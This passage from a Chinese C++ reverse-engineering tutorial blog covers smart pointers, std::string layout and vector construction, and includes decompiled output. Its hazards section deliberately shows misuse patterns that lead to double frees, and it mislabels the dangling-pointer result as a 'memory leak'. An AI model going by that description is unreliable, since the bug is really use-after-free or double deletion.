class="hljs-string">&quot;~person\n&quot;</span>;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//独占式的指针对象，在任何时间、资源只能被一个指针占有，当unique_ptr离开作用域，指针所包含的内容会被释放。</span><br><span class="hljs-function"><span class="hljs-built_in">unique_ptr</span>&lt;person&gt; <span class="hljs-title">pointer</span><span class="hljs-params">(<span class="hljs-keyword">new</span> person)</span></span>;<br><span class="hljs-comment">//person *a = new person;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>unique_ptr在离开作用域时会自动帮你释放内存而不需要手动delete，所以叫“智能”。</p><p>有个特点就是对象只能被一个指针占有,代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">person</span></span><br><span class="hljs-class">&#123;</span><br>~person()<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;~person\n&quot;</span>;<br>&#125;<br><span class="hljs-built_in">string</span> str;<br>&#125;;<br><span class="hljs-function"><span class="hljs-built_in">unique_ptr</span>&lt;person&gt; <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">unique_ptr</span>&lt;person&gt;(<span class="hljs-keyword">new</span> person);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">unique_ptr</span>&lt;person&gt; pointer = test();<br>pointer-&gt;str = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-built_in">unique_ptr</span>&lt;person&gt; p2 = move(pointer);<br><span class="hljs-keyword">if</span> (!pointer)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;pointer为空\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (p2)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;p2不为空\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20201004194754698.png" alt="image-20201004194754698"></p><p>反编译康康</p><p>有c++逆向内味了</p><p><img src="image-20201004194936044.png" alt="image-20201004194936044"></p><p>随便一个函数就占了近100行</p><p>再看看shared_ptr </p><p>如果理解了上面的，理解这个很容易，多了个方法就是查看引用计数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">sp</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(<span class="hljs-string">&quot;hello&quot;</span>))</span></span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; sp.use_count() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; *sp &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-built_in">string</span>&gt; sp1 = sp;<br><span class="hljs-built_in">cout</span> &lt;&lt; sp.use_count() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面就要讲下智能指针的问题了</p><h3 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">person</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;person\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; <span class="hljs-title">getshared</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">shared_ptr</span>&lt;person&gt;(<span class="hljs-keyword">this</span>);<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; <span class="hljs-title">ptr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> person)</span></span>;<br><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; ptr2 = ptr-&gt;getshared();<br><span class="hljs-built_in">cout</span> &lt;&lt; ptr.use_count() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>打印出来的结果是1，所以当main函数结束后，ptr释放了，计数-1，此时ptr2还指向一个被释放的内存，这就出现了内存泄漏。</p><p>想要解决问题的话得用另一个模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">person</span></span><br><span class="hljs-class">:</span>enable_shared_from_this&lt;person&gt;&#123;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;person\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; <span class="hljs-title">getshared</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> shared_from_this();<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; <span class="hljs-title">ptr</span><span class="hljs-params">(<span class="hljs-keyword">new</span> person)</span></span>;<br><span class="hljs-built_in">shared_ptr</span>&lt;person&gt; ptr2 = ptr-&gt;getshared();<br><span class="hljs-built_in">cout</span> &lt;&lt; ptr.use_count() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然问题不止这个</p><p>比如用裸指针创建时</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">( )</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 错误</span><br> <span class="hljs-keyword">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>;<br> <span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sptr1</span><span class="hljs-params">( p)</span></span>;   <span class="hljs-comment">// count 1</span><br> <span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sptr2</span><span class="hljs-params">( p )</span></span>;  <span class="hljs-comment">// count 1</span><br><br><span class="hljs-comment">// 正确</span><br> <span class="hljs-function"><span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sptr1</span><span class="hljs-params">( <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span> )</span></span>;  <span class="hljs-comment">// count 1</span><br> <span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">int</span>&gt; sptr2 = sptr1;     <span class="hljs-comment">// count 2</span><br> <span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-keyword">int</span>&gt; sptr3;           <br> sptr3 =sptr1                       <span class="hljs-comment">// count 3</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="STRING"><a href="#STRING" class="headerlink" title="STRING"></a>STRING</h2><p>内存布局前16个为字符空间，这是当字符长度小于16时，后面一个unsigned int表示目前字符串长度，在后面一个表示容量capacity</p><p>当长度大于容量时会扩容</p><p>当长度大于15时，内存布局开头会变成一个指针，指针指向处为字符串</p><h2 id="VECTOR"><a href="#VECTOR" class="headerlink" title="VECTOR"></a>VECTOR</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">test1</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">test2</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">test3</span><span class="hljs-params">(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">test4</span><span class="hljs-params">(test3)</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">test5</span><span class="hljs-params">(test4.begin(),test4.end())</span></span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp-1Ch] [ebp-1B4h]</span><br>  <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [esp-18h] [ebp-1B0h]</span><br>  <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp-14h] [ebp-1ACh]</span><br>  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [esp-10h] [ebp-1A8h]</span><br>  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [esp-Ch] [ebp-1A4h]</span><br>  <span class="hljs-keyword">int</span> v11; <span class="hljs-comment">// [esp-8h] [ebp-1A0h]</span><br>  <span class="hljs-keyword">int</span> v12; <span class="hljs-comment">// [esp-4h] [ebp-19Ch]</span><br>  <span class="hljs-keyword">int</span> v13; <span class="hljs-comment">// [esp+0h] [ebp-198h]</span><br>  <span class="hljs-keyword">int</span> v14; <span class="hljs-comment">// [esp+4h] [ebp-194h]</span><br>  <span class="hljs-keyword">int</span> v15; <span class="hljs-comment">// [esp+10h] [ebp-188h]</span><br>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// [esp+18h] [ebp-180h]</span><br>  <span class="hljs-keyword">int</span> *v17; <span class="hljs-comment">// [esp+24h] [ebp-174h]</span><br>  <span class="hljs-keyword">char</span> *v18; <span class="hljs-comment">// [esp+30h] [ebp-168h]</span><br>  <span class="hljs-keyword">int</span> v19; <span class="hljs-comment">// [esp+48h] [ebp-150h]</span><br>  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [esp+15Ch] [ebp-3Ch]</span><br>  <span class="hljs-keyword">int</span> v21; <span class="hljs-comment">// [esp+194h] [ebp-4h]</span><br><br>  __CheckForDebuggerJustMyCode(&amp;unk_424033);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::__autoclassinit2(<span class="hljs-number">0x10</span>u);<br>  v3 = <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;::allocator&lt;<span class="hljs-keyword">int</span>&gt;(v13, v14);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(<span class="hljs-number">5</span>, v3);<br>  v21 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::__autoclassinit2(<span class="hljs-number">0x10</span>u);<br>  v19 = <span class="hljs-number">3</span>;<br>  v4 = <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;::allocator&lt;<span class="hljs-keyword">int</span>&gt;(v13, v14);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(<span class="hljs-number">5</span>, &amp;v19, v4);<br>  LOBYTE(v21) = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::__autoclassinit2(<span class="hljs-number">0x10</span>u);<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(&amp;v20);<br>  LOBYTE(v21) = <span class="hljs-number">2</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::__autoclassinit2(<span class="hljs-number">0x10</span>u);<br>  v12 = <span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;::allocator&lt;<span class="hljs-keyword">int</span>&gt;(v13, v14);<br>  v18 = &amp;v9;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::end(&amp;v9);<br>  v17 = &amp;v6;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::begin(&amp;v6);<br>  v15 = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(v6, v7, v8, v9, v10, v11, v12);<br>  v16 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(v13, v14);<br>  LOBYTE(v21) = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(v13, v14);<br>  LOBYTE(v21) = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(v13, v14);<br>  v21 = <span class="hljs-number">0xFFFFFFFF</span>;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::~<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;(v13, v14);<br>  <span class="hljs-keyword">return</span> 